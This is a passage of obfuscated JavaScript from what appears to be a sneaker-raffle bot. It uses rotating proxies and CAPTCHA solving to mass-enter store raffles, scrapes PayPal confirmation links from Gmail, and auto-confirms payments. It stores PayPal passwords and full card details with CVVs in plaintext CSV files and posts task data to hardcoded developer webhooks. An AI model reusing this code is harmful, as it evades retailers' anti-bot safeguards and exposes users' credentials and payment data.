        for (var _0x226955 = 0x0; _0x226955 < _0x125a9b['length']; _0x226955++) {
            console['log']('(' + _0x226955 + ')\x20' + _0x125a9b[_0x226955]['Email']);
        }
        console['log']('\x0a(' + _0x125a9b['length'] + ')\x20' + _0x136200['cyan']('Add\x20a\x20new\x20account'));
        let _0x1df565 = await _0x136b91['get']('Option');
        if (_0x1df565['Option'] < _0x125a9b['length'])
            return _0x125a9b[_0x1df565['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x16f644 = {}, _0x30c0ce = await _0x136b91['get']('Email');
        _0x16f644['Email'] = _0x30c0ce['Email'];
        var _0x5f48e6 = Math['round'](Math['random']() * (_0x293519['length'] - 0x1));
        _0x16f644['Proxy'] = _0x293519[_0x5f48e6], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x48f4ba = await _0x136b91['get']('Password');
        return _0x16f644['Password'] = _0x48f4ba['Password'], _0x190b67['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x16f644['Email'] + ',' + _0x16f644['Password'] + ',' + _0x16f644['Proxy']), _0x16f644;
    }
    let _0x5f5090 = await _0x43f6f3();
    var _0x299c2e = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x2b59d0 = await _0x136b91['get']('Amount'), _0x50db10 = _0x2b59d0['Amount'];
    async function _0xe31120() {
        let _0x5decf6 = 0x0;
        var _0x2d8a8a = new _0x548918({
            'user': _0x120b49['masterMail'],
            'password': _0x120b49['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0xf858c1(_0x53a186) {
            _0x2d8a8a['openBox']('INBOX', ![], _0x53a186);
        }
        _0x2d8a8a['once']('ready', function () {
            _0xf858c1(function (_0x3b396d, _0x418b66) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x3b396d)
                    throw _0x3b396d;
                _0x2d8a8a['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x575d5f, _0x2ed03c) {
                    if (!_0x2ed03c || !_0x2ed03c['length'])
                        console['log'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20No\x20mails\x20found'), _0x2d8a8a['end']();
                    else {
                        _0x2ed03c = _0x2ed03c['slice'](0x0, _0x50db10);
                        var _0x38d7cf = _0x2d8a8a['seq']['fetch'](_0x2ed03c, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x38d7cf['on']('message', function (_0x57ec6b, _0x52fb17) {
                            var _0x5419e5 = '(#' + _0x52fb17 + ')\x20';
                            _0x57ec6b['on']('body', function (_0x5afb58, _0x57e2b6) {
                                _0x26bd25(_0x5afb58, (_0x15df49, _0x4f38d4) => {
                                    if (_0x4f38d4['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x4f38d4['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x4f38d4['text']['split']('[')[0x2];
                                        var _0x2f4351 = mes['split'](']')[0x0];
                                        _0x299c2e['push'](_0x2f4351);
                                    }
                                });
                            }), _0x57ec6b['once']('end', function () {
                                _0x5decf6++;
                            });
                        }), _0x38d7cf['once']('error', function (_0x1c603f) {
                            console['log']('Fetch\x20error:\x20' + _0x1c603f);
                        }), _0x38d7cf['once']('end', function () {
                            _0x2d8a8a['end']();
                        });
                    }
                });
            });
        }), _0x2d8a8a['once']('error', function (_0x420665) {
            console['log'](_0x136200['red'](_0x420665['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x2d8a8a['once']('end', async function () {
        }), _0x2d8a8a['connect']();
    }
    try {
        _0xe31120(), await _0x2121c3(0xfa0), console['log']('Found\x20' + _0x299c2e['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x2121c3(0xfa0);
    }
    var _0x906230;
    _0x3aeb59('' + _0x167265);
    var _0x306be5 = _0x5f5090['Proxy']['split'](':'), _0x4d4f68;
    try {
        _0x4d4f68 = await _0x586b7d['launch']({
            'userDataDir': 'sessions/' + _0x5f5090['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x306be5[0x0] + ':' + _0x306be5[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x4d4f68 = await _0x586b7d['launch']({
            'userDataDir': 'sessions/' + _0x5f5090['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x306be5[0x0] + ':' + _0x306be5[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20Getting\x20Session');
        const _0x13048e = await _0x4d4f68['newPage']();
        await _0x13048e['authenticate']({
            'username': '' + _0x306be5[0x2],
            'password': '' + _0x306be5[0x3]
        }), await _0x13048e['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x13048e['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x13048e['waitForSelector']('#email');
            let _0x3904eb = await _0x13048e['$eval']('#email', _0x573b46 => _0x573b46['getAttribute']('value'));
            if (_0x3904eb == '') {
                await _0x13048e['type']('#email', _0x5f5090['Email']), await _0x2121c3(0x1d3);
                let _0x108ad8 = await _0x13048e['$']('#splitPassword');
                _0x108ad8 && (await _0x13048e['click']('#btnNext'), await _0x2121c3(0xa28)), await _0x13048e['type']('#password', _0x5f5090['Password']), await _0x2121c3(0x35c), await _0x13048e['click']('#btnLogin');
            } else
                await _0x13048e['type']('#password', _0x5f5090['Password']), await _0x2121c3(0x35c), await _0x13048e['click']('#btnLogin');
            await _0x13048e['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20Successfully\x20logged\x20in'), await _0x2121c3(0x2710);
        } catch (_0x2daf38) {
            throw new Error('Login\x20session\x20expired\x20' + _0x2daf38);
        }
        for (var _0x383ac6 = 0x0; _0x383ac6 < _0x299c2e['length']; _0x383ac6++) {
            console['log'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20Task\x20' + (_0x383ac6 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x3aeb59(_0x167265 + '\x20Task\x20' + (_0x383ac6 + 0x1) + '\x20/\x20' + _0x299c2e['length']);
            const _0x4c2b96 = await _0x4d4f68['newPage']();
            await _0x4c2b96['goto']('' + _0x299c2e[_0x383ac6], { 'waitUntil': 'networkidle2' }), await _0x2121c3(0xbb8);
            try {
                const _0x4b0302 = await _0x4c2b96['$']('#challenge-heading');
                _0x4b0302 && (console['log'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20Task\x20' + (_0x383ac6 + 0x1) + '\x20:\x20' + _0x136200['yellow']('2FA\x20Required')), await _0x4c2b96['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x2121c3(0x9c40), await _0x4c2b96['waitForSelector']('#payment-submit-btn'), await _0x4c2b96['$eval']('#payment-submit-btn', _0x2b7868 => _0x2b7868['click']()), await _0x4c2b96['click']('#payment-submit-btn');
                try {
                    await _0x4c2b96['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x2121c3(0x5dc), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20Task\x20' + (_0x383ac6 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x5d0690) {
                    _0x584139 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x5d0690['message']);
                } finally {
                    if (_0x584139 == 'yes' && _0x280761 != 0x2) {
                        console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x167265['name'] + ']\x20Task\x20' + (_0x383ac6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x280761 + '\x20/\x205)')), _0x383ac6 = _0x383ac6 - 0x1, _0x280761 = _0x280761 + 0x1;
                        continue;
                    }
                    _0x584139 == 'yes' && _0x280761 >= 0x2 && (_0x17abd2(csv[_0x383ac6], _0x167265), _0x584139 = 'no', _0x280761 = 0x0), await _0x4c2b96['close'](), await _0x2121c3(0x4650);
                }
            } catch (_0x5c9262) {
                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x167265 + ']\x20Task\x20' + (_0x383ac6 + 0x1) + '\x20:\x20' + _0x5c9262));
            }
        }
    } catch (_0x2d3f2a) {
        console['log'](_0x136200['red']('' + _0x2d3f2a));
    } finally {
        await _0x4d4f68['close']();
    }
}
const _0x4fd9f4 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x36a801, _0x364e76, _0x47b0ec) {
                _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x120b49['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x189d18 = 0x0; _0x189d18 < _0x364e76['length']; _0x189d18++) {
                    if (_0x30fa75 != 'yes')
                        var _0x30fa75 = '', _0x2e2e6e = 0x0;
                    var _0x584991;
                    try {
                        await _0x30a360(_0x364e76, _0x189d18);
                    } catch {
                        _0x30fa75 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x3aeb59(_0x36a801['name'] + '\x20Task\x20' + (_0x189d18 + 0x1) + '\x20/\x20' + _0x364e76['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                    var _0x491762 = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x4de19a = Math['round'](Math['random']() * (_0x491762['length'] - 0x1));
                    _0x364e76[_0x189d18]['Size'] == 'RANDOM' && (_0x364e76[_0x189d18]['Size'] = _0x491762[_0x4de19a]);
                    var _0x5a4471 = Math['round'](Math['random']() * (_0x47b0ec['length'] - 0x1)), _0x9345b4 = _0x47b0ec[_0x5a4471]['split'](':'), _0x4db2c3;
                    try {
                        _0x4db2c3 = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x9345b4[0x0] + ':' + _0x9345b4[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4db2c3 = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x9345b4[0x0] + ':' + _0x9345b4[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x1c404f = await _0x4db2c3['newPage']();
                        await _0x1c404f['authenticate']({
                            'username': '' + _0x9345b4[0x2],
                            'password': '' + _0x9345b4[0x3]
                        }), await _0x1c404f['setRequestInterception'](!![]), _0x1c404f['on']('request', _0x56173d => {
                            _0x56173d['resourceType']() === 'image' || _0x56173d['resourceType']() === 'font' || _0x56173d['resourceType']() === 'media' ? _0x56173d['abort']() : _0x56173d['continue']();
                        }), await _0x1c404f['goto'](_0x364e76[_0x189d18]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x2121c3(0x3e8), await _0x1c404f['waitForSelector']('#accept-all-gdpr'), await _0x1c404f['click']('#accept-all-gdpr'), await _0x1c404f['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x2121c3(0xbb8);
                        let _0x101604 = await _0x1c404f['$$']('button');
                        for (button of _0x101604) {
                            let _0x1be872 = await _0x1c404f['evaluate'](_0x24c44d => _0x24c44d['innerHTML'], button);
                            if (_0x1be872['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x2121c3(0x1388), await _0x1c404f['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x2121c3(0x3e8);
                        let _0x21d9bc = await _0x1c404f['$$']('input[name=\x22email\x22]');
                        await _0x21d9bc[0x1]['click'](), await _0x2121c3(0x12c), await _0x1c404f['keyboard']['type'](_0x364e76[_0x189d18]['Email']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22Nombre\x22]', _0x364e76[_0x189d18]['FirstName'] + '\x20' + _0x364e76[_0x189d18]['LastName']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22Direccion\x22]', _0x364e76[_0x189d18]['Address1'] + '\x20' + _0x364e76[_0x189d18]['HouseNumber'] + '\x20' + _0x364e76[_0x189d18]['Address2']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22Ciudad\x22]', _0x364e76[_0x189d18]['City']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22Provincia\x22]', _0x364e76[_0x189d18]['State']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22CP\x22]', _0x364e76[_0x189d18]['Zip']), await _0x2121c3(0x1c2), await _0x1c404f['select']('select[name=\x22Pais\x22]', _0x364e76[_0x189d18]['Country']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22Telefono\x22]', _0x364e76[_0x189d18]['Phone']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22cumple\x22]', _0x398a3b(0x1, 0x14) + '-' + _0x398a3b(0x1, 0xb) + '-' + _0x398a3b(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22Instagram\x22]', _0x364e76[_0x189d18]['Follower']), await _0x2121c3(0x1c2), await _0x1c404f['type']('input[name=\x22Talla\x22]', _0x364e76[_0x189d18]['Size']), await _0x2121c3(0x1f4), await _0x1c404f['click']('#sexo_hombre'), await _0x2121c3(0x1f4), await _0x1c404f['click']('#idioma_ingles'), await _0x2121c3(0x1f4), await _0x1c404f['click']('#privacidad_si'), await _0x2121c3(0x1f4), await _0x1c404f['click']('#acepta_suscripcion_si'), await _0x2121c3(0x1f4), console['log'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x2931bd = await _0x1c404f['$$']('button');
                        for (button of _0x2931bd) {
                            let _0x14a1f9 = await _0x1c404f['evaluate'](_0x15f4ba => _0x15f4ba['innerHTML'], button);
                            if (_0x14a1f9['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x2121c3(0x1388), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x30fa75 = '';
                        var _0x3f2acb = await _0x12b988(_0x364e76[_0x189d18], _0x36a801, 'dev', ![]), _0x351c08 = await _0x12b988(_0x364e76[_0x189d18], _0x36a801, 'pub', ![]);
                        const _0x601ac1 = {
                            'succesDEVMSG': { 'embeds': [_0x3f2acb] },
                            'succesPUBMSG': { 'embeds': [_0x351c08] }
                        };
                        try {
                            _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x601ac1['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x601ac1['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0x601ac1['succesPUBMSG']);
                        } catch (_0x19d203) {
                            console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x19d203));
                        }
                    } catch (_0x2349b2) {
                        console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20' + _0x2349b2)), _0x584991 = '' + _0x2349b2;
                        var _0xa8fed6 = await _0x12b988(_0x364e76[_0x189d18], _0x36a801, 'dev', !![], _0x584991), _0x3f2acb = await _0x12b988(_0x364e76[_0x189d18], _0x36a801, 'dev', ![]), _0x351c08 = await _0x12b988(_0x364e76[_0x189d18], _0x36a801, 'pub', ![]);
                        const _0x3e90e4 = {
                            'succesDEVMSG': { 'embeds': [_0x3f2acb] },
                            'succesPUBMSG': { 'embeds': [_0x351c08] }
                        };
                        _0x3e90e4['errorDEV'] = { 'embeds': [_0xa8fed6] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x3e90e4['errorDEV']), await _0x5f1090(_0x32737e, _0x3e90e4['errorDEV']), _0x2349b2 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x30fa75 = 'yes');
                    } finally {
                        _0x4db2c3['close']();
                        if (_0x30fa75 == 'yes' && _0x2e2e6e != 0x5 && _0x584991 != 'Size\x20Not\x20Found') {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Task\x20' + (_0x189d18 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2e2e6e + '\x20/\x205)\x20')), _0x189d18 = _0x189d18 - 0x1, _0x2e2e6e = _0x2e2e6e + 0x1;
                            continue;
                        }
                        _0x30fa75 == 'yes' && _0x2e2e6e >= 0x5 && (_0x17abd2(_0x364e76[_0x189d18], _0x36a801), _0x30fa75 = 'no', _0x2e2e6e = 0x0), console['log'](_0x29f6be() + '\x20[' + _0x36a801['name'] + ']\x20Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'ADIDAS\x20CONFIRMED',
        'modules': [
            {
                'name': 'CONFIRMED\x20Account\x20Generator',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x4a4e60, _0x4a9386) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0x190b67['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x4a9386) {
                        _0x190b67['appendFileSync']('proxies.txt', _0x4a9386[proxy] + '\x0a');
                    }
                    for (var _0xc94b24 = 0x0; _0xc94b24 < _0x4a4e60['length']; _0xc94b24++) {
                        await _0x30a360(_0x4a4e60, _0xc94b24), _0x190b67['appendFileSync']('tasks.csv', '\x0a' + _0x4a4e60[_0xc94b24]['Url'] + ',' + _0x4a4e60[_0xc94b24]['Size'] + ',' + _0x4a4e60[_0xc94b24]['Email'] + ',' + _0x4a4e60[_0xc94b24]['Password'] + ',' + _0x4a4e60[_0xc94b24]['FirstName'] + ',' + _0x4a4e60[_0xc94b24]['LastName'] + ',' + _0x4a4e60[_0xc94b24]['Address1'] + ',' + _0x4a4e60[_0xc94b24]['Address2'] + ',' + _0x4a4e60[_0xc94b24]['HouseNumber'] + ',' + _0x4a4e60[_0xc94b24]['Zip'] + ',' + _0x4a4e60[_0xc94b24]['City'] + ',' + _0x4a4e60[_0xc94b24]['Country'] + ',' + _0x4a4e60[_0xc94b24]['State'] + ',' + _0x4a4e60[_0xc94b24]['CardNumber'] + ',' + _0x4a4e60[_0xc94b24]['ExpiryDate'] + ',' + _0x4a4e60[_0xc94b24]['CVV'] + ',' + _0x4a4e60[_0xc94b24]['NameOnCard'] + ',' + _0x4a4e60[_0xc94b24]['Phone'] + ',' + _0x4a4e60[_0xc94b24]['Follower']);
                    }
                    await _0x2121c3(0x3e8), _0x47e099('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempgen.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Info\x20Adder',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x245e3d, _0x13efc5) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..');
                    for (var _0x2dd360 = 0x0; _0x2dd360 < _0x245e3d['length']; _0x2dd360++) {
                        await _0x30a360(_0x245e3d, _0x2dd360), _0x190b67['appendFileSync']('tasks.csv', '\x0a' + _0x245e3d[_0x2dd360]['Url'] + ',' + _0x245e3d[_0x2dd360]['Size'] + ',' + _0x245e3d[_0x2dd360]['Email'] + ',' + _0x245e3d[_0x2dd360]['Password'] + ',' + _0x245e3d[_0x2dd360]['FirstName'] + ',' + _0x245e3d[_0x2dd360]['LastName'] + ',' + _0x245e3d[_0x2dd360]['Address1'] + ',' + _0x245e3d[_0x2dd360]['Address2'] + ',' + _0x245e3d[_0x2dd360]['HouseNumber'] + ',' + _0x245e3d[_0x2dd360]['Zip'] + ',' + _0x245e3d[_0x2dd360]['City'] + ',' + _0x245e3d[_0x2dd360]['Country'] + ',' + _0x245e3d[_0x2dd360]['State'] + ',' + _0x245e3d[_0x2dd360]['CardNumber'] + ',' + _0x245e3d[_0x2dd360]['ExpiryDate'] + ',' + _0x245e3d[_0x2dd360]['CVV'] + ',' + _0x245e3d[_0x2dd360]['NameOnCard'] + ',' + _0x245e3d[_0x2dd360]['Phone'] + ',' + _0x245e3d[_0x2dd360]['Follower']);
                    }
                    await _0x2121c3(0x3e8), _0x47e099('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempadd.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Entries',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x4a8269, _0x6d7ad0) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0x190b67['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x6d7ad0) {
                        _0x190b67['appendFileSync']('proxies.txt', _0x6d7ad0[proxy] + '\x0a');
                    }
                    for (var _0x53d6e5 = 0x0; _0x53d6e5 < _0x4a8269['length']; _0x53d6e5++) {
                        await _0x30a360(_0x4a8269, _0x53d6e5), _0x190b67['appendFileSync']('tasks.csv', '\x0a' + _0x4a8269[_0x53d6e5]['Url'] + ',' + _0x4a8269[_0x53d6e5]['Size'] + ',' + _0x4a8269[_0x53d6e5]['Email'] + ',' + _0x4a8269[_0x53d6e5]['Password'] + ',' + _0x4a8269[_0x53d6e5]['FirstName'] + ',' + _0x4a8269[_0x53d6e5]['LastName'] + ',' + _0x4a8269[_0x53d6e5]['Address1'] + ',' + _0x4a8269[_0x53d6e5]['Address2'] + ',' + _0x4a8269[_0x53d6e5]['HouseNumber'] + ',' + _0x4a8269[_0x53d6e5]['Zip'] + ',' + _0x4a8269[_0x53d6e5]['City'] + ',' + _0x4a8269[_0x53d6e5]['Country'] + ',' + _0x4a8269[_0x53d6e5]['State'] + ',' + _0x4a8269[_0x53d6e5]['CardNumber'] + ',' + _0x4a8269[_0x53d6e5]['ExpiryDate'] + ',' + _0x4a8269[_0x53d6e5]['CVV'] + ',' + _0x4a8269[_0x53d6e5]['NameOnCard'] + ',' + _0x4a8269[_0x53d6e5]['Phone'] + ',' + _0x4a8269[_0x53d6e5]['Follower']);
                    }
                    await _0x2121c3(0x3e8), _0x47e099('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/sensor.py'
                    ], { 'shell': !![] });
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x1e5ada, _0x5c0a85, _0x3e82b1) {
                for (var _0xb56397 = 0x0; _0xb56397 < _0x5c0a85['length']; _0xb56397++) {
                    _0x120b49['AfewDelay'] = _0x120b49['delay'];
                    var _0x281ca5;
                    if (_0x38c6a1 != 'yes')
                        var _0x38c6a1 = '', _0x43349c = 0x0;
                    var _0x21fcad = _0x5c0a85[_0xb56397]['Url'], _0x41dd2d = _0x5c0a85[_0xb56397];
                    _0x3aeb59(_0x1e5ada['name'] + '\x20Task\x20' + (_0xb56397 + 0x1) + '\x20/\x20' + _0x5c0a85['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                    try {
                        await _0x30a360(_0x5c0a85, _0xb56397);
                    } catch {
                        _0x38c6a1 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x17c689(_0x519118) {
                        const _0x1557ce = _0x190b67['readFileSync']('../successful-tasks.csv', 'utf8'), _0x484505 = _0x32de35['parse'](_0x1557ce, { 'header': !![] })['data'];
                        let _0x3fbb4b = ![];
                        for (var _0x17fcd9 of _0x484505) {
                            if (_0x17fcd9['Url'] == _0x519118['Url'] && _0x17fcd9['Email'] == _0x519118['Email']) {
                                _0x3fbb4b = !![];
                                break;
                            }
                        }
                        return _0x3fbb4b;
                    }
                    if (await _0x17c689(_0x5c0a85[_0xb56397]) == !![]) {
                        console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x1f84a4 = await _0x12b988(_0x5c0a85[_0xb56397], _0x1e5ada, 'dev', ![]), _0x15ebb7 = await _0x12b988(_0x5c0a85[_0xb56397], _0x1e5ada, 'pub', ![]);
                    const _0x5378c8 = {
                        'succesDEVMSG': { 'embeds': [_0x1f84a4] },
                        'succesPUBMSG': { 'embeds': [_0x15ebb7] }
                    };
                    if (_0x5c0a85[_0xb56397]['Email'] == '' || _0x5c0a85[_0xb56397]['FirstName'] == '' || _0x5c0a85[_0xb56397]['LastName'] == '' || _0x5c0a85[_0xb56397]['Country'] == '' || _0x5c0a85[_0xb56397]['Size'] == '' || _0x5c0a85[_0xb56397]['Address1'] == '' || _0x5c0a85[_0xb56397]['Zip'] == '') {
                        console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x5c0a85[_0xb56397]['Country']['length'] == 0x2 && (_0x5c0a85[_0xb56397]['Country'] = _0x22bb5e[_0x5c0a85[_0xb56397]['Country']]);
                    if (_0x120b49['useRandomProxy'] = ![])
                        var _0x2b5f18 = _0x3e82b1[_0xb56397]['split'](':');
                    else
                        var _0x1a0ed0 = Math['round'](Math['random']() * (_0x3e82b1['length'] - 0x1)), _0x2b5f18 = _0x3e82b1[_0x1a0ed0]['split'](':');
                    var _0x2c3b8b;
                    try {
                        _0x2c3b8b = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2b5f18[0x0] + ':' + _0x2b5f18[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2c3b8b = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x2b5f18[0x0] + ':' + _0x2b5f18[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x42281d = JSON['parse'](_0x190b67['readFileSync']('sizes.json', 'utf-8')), _0x21fcad = _0x5c0a85[_0xb56397]['Url'], _0x217ddf = _0x5c0a85[_0xb56397]['Size'], _0x3550f3;
                        async function _0xe27911() {
                            var _0x14be47 = new _0x396ced['CookieJar']();
                            console['log'](_0x29f6be() + '\x20[' + _0x1e5ada['name'] + ']\x20Task\x20' + (_0xb56397 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x3f8dc3;
